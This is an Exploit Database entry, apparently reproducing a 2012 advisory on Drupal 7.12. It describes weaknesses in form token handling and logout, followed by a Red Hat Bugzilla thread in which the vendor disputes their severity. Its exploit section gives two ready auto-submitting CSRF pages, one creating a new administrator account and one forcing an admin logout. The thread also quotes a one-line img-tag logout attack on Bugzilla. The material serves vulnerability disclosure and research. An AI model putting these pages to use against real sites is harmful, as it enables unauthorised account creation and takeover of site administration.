 2.2 Poor Session Checking (CSRF to Force administrator logout)
 2.3 Poor Session Checking (POST and GET method)
 2.4 Poor Session Checking (Http Referer)
3)Exploit
 3.1 Exploit (Add Administrator)
 3.2 Exploit (Force logout)

+---------------------------------------------------------------------------------------------------------------------------------------------------+

1)Introduction
Drupal "is an open source content management platform powering millions of websites and applications. Its built, used, and supported by an active
and diverse community of people around the world".

2)Vulnerability Description
Drupal 7.12 -latest stable release - suffers from multiple vulnerabilities which could allow an attacker to gain access to the management interface.

 2.1 Poor Session Checking (CSRF to change any Drupal settings)
 Drupal, to secure changes made by administrators or users through web management interface, uses "form_token" parameter which is sent inside
 any http POST request.
 There is a security flaw inside the logic with which this parameter is generated, as is used the same parameter for for similar operations
 (the same "form_id") in the same session (for example for article's creation Drupal assigns the same "form_token", for admin/user
 creation Drupal assigns the same "form_token" and so on).
 Another flaw is inside "form_buid_id" parameter, which is used to fetch state from a database table during certain operations. This parameter
 is generated different for any operation an admin/user performs, but Drupal allows to use any other Drupal generated "form_buid_id" parameter
 (like this: "form-0iFqLlofT1uuJ_uwXPNdVlc_J9KL20oZE15dK9hxuQ8") to make changes to Drupal settings through web management  interface.
 So, even if Drupal  creates a different "form_buid_id" for any operation you can use another "form_buid_id"compatible with Drupal instead of that
 generated by Drupa for that specific operation.
 These flaws can be used by an attacker who knows the values of "form_buid_id" and "form_token" parameters (for example an internal attacker
 performing a "Man in The Middle Attack" or an external attacker that controls an internal client by an client-side exploit, an external attacker
 that controls directly a Drupal admin by a client-side exploit and son on. There are many possibilities) to create an "ad-hoc" crafted web page
 in order to makes any Drupal changes (add administrator, delete administrator, add web pages, delete web pages, ....) when a Drupal administrator
 or User browses that crafted web page.

 2.2 Poor Session Checking (CSRF to Force administrator logout)
 There is another vulnerability - always related to poor session checking / improper input validation - in "<drupal_ip>/user/logout" which allows
 an attacker to create a crafted web page an force logout of Drupal administrator/users at web management interface. This vulnerability - forcing
 administrator logout - will aid an attacker to sniff authentication credentials when a "Man in The Middle Attack" is performed.

 2.3 Poor Session Checking (POST and GET method)
 Drupal does not check "GET" or "POST" http method allowing, even though normal logout is made via http GET request, to exploit the above vulnerability
 using http POST method.

 2.4 Poor Session Checking (Http Referer)
 Drupal, furthermore, does not perform "http referer" checking, allowing to exploit all above described vulnerabilities.

3)Exploit

 3.1 Exploit (Add Administrator)
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <H2>CSRF Exploit change user to admin</H2>
 <form method="POST" name="form0" action="http://<drupal_ip>:80/drupal/admin/people/create?render=overlay&render=overlay">
 <input type="hidden" name="name" value="new_admin"/>
 <input type="hidden" name="mail" value="new_admin@new_admin.com"/>
 <input type="hidden" name="pass[pass1]" value="new_password"/>
 <input type="hidden" name="pass[pass2]" value="new_password"/>
 <input type="hidden" name="status" value="1"/>
 <input type="hidden" name="roles[3]" value="3"/>
 <input type="hidden" name="timezone" value="Europe/Prague"/>
 <input type="hidden" name="form_build_id" value="form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY"/>
 <input type="hidden" name="form_token" value="cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc"/>
 <input type="hidden" name="form_id" value="user_register_form"/>
 <input type="hidden" name="op" value="Create new account"/>
 </form>
 </body>
 </html>

 3.2 Exploit (Force logout)
 <html>
 <body onload="javascript:document.forms[0].submit()">
 <H2>CSRF Exploit to logout Admin</H2>
 <form method="POST" name="form0" action="http://<drupal_ip>:80/drupal/user/logout">
 </form>
 </body>
 </html>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

| [Description](show_bug.cgi?id=807859#c0)  Vincent Danen    2012-03-28 23:47:59 UTC  ``` Common Vulnerabilities and Exposures assigned an identifier [CVE-2007-6752](https://access.redhat.com/security/cve/CVE-2007-6752) to the following vulnerability:  Name: [CVE-2007-6752](https://access.redhat.com/security/cve/CVE-2007-6752) URL: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6752> Assigned: 20120327 Reference: EXPLOIT-DB:18564 Reference: <http://www.exploit-db.com/exploits/18564/> Reference: <http://drupal.org/node/144538> Reference: <http://groups.drupal.org/node/216314> Reference: <http://ivanobinetti.blogspot.it/2012/03/drupal-cms-712-latest-stable-release.html> Reference: <http://packetstormsecurity.org/files/110404/drupal712-xsrf.txt>  ** DISPUTED ** Cross-site request forgery (CSRF) vulnerability in Drupal 7.12 and earlier allows remote attackers to hijack the authentication of arbitrary users for requests that end a session via the user/logout URI.  NOTE: the vendor disputes the significance of this issue, by considering the "security benefit against platform complexity and performance impact" and concluding that a change to the logout behavior  NOTE: I was able to reproduce this on drupal6 as well.   ```  [Comment 1](show_bug.cgi?id=807859#c1)  Vincent Danen    2012-03-28 23:55:34 UTC  ``` Also forgot to note that there is currently no upstream fix for this as of yet, so I'm not filing Fedora or EPEL trackers for it.   ```  [Comment 2](show_bug.cgi?id=807859#c2)  Gwyn Ciesla    2012-03-29 12:58:29 UTC  ``` Eek.  What a tempest.  It looks like neither the exploit nor the patch attempts are meeting with much success so far.  I'll keep an eye on this.   ```  [Comment 3](show_bug.cgi?id=807859#c3)  Greg Knaddison    2012-03-29 23:56:01 UTC  ``` I believe the analysis of this report could be applied, for example, to Bugzilla and find it has similar flaws. Bugzilla uses  an input type="hidden" name="token" value="long-hash" to provide csrf protection, no? And if someone could sniff that value via mitm or client-side sniffing, does bugzilla have protection such as referrer detection?  The CSRF logout "vulnerability" seems to exist as well. Consider this attack &lt;img src="<https://bugzilla.redhat.com/index.cgi?logout=1>"&gt;  I welcome your analysis and the Drupal project is open to constructive criticism, but I believe most web applications are vulnerable to these issues. That's why we suggest fixes that are at different layers in the stack (e.g. https).  For sites built in Drupal that need extra protection (e.g. for the logout issue) there is a contributed module at <http://drupal.org/sandbox/davereid/1332490> which uses our standard token system.  Sites that want to add referrer detection to some or all form actions could do so via the Form API, though I'm not aware of such a module in existence.   ```  [Comment 4](show_bug.cgi?id=807859#c4)  Ivano Binetti    2012-04-05 18:02:42 UTC  ``` Greg, to exploit this vulnerability (force administrator/user's logout) you don't need to sniff anti-CSRF token. You have only to create a web page containing a simple POST (or GET, as Drupal don't care about it) http request , as explained in my Original Advisory (<http://www.webapp-security.com/wp-content/uploads/2012/03/Drupal-7.12-latest-stable-release-Multiple-Vulnerabilities.txt>).   As I've already explained in Drupal's Group (<http://groups.drupal.org/node/216314>) only to add Drupal Administrator you have to sniff anti-CSRF token due to a "problem" related to token's logic generation. MITRE CVE Numbering Authority classified my recommendations about token generation as Drupal's "security improvements".   ``` |  |
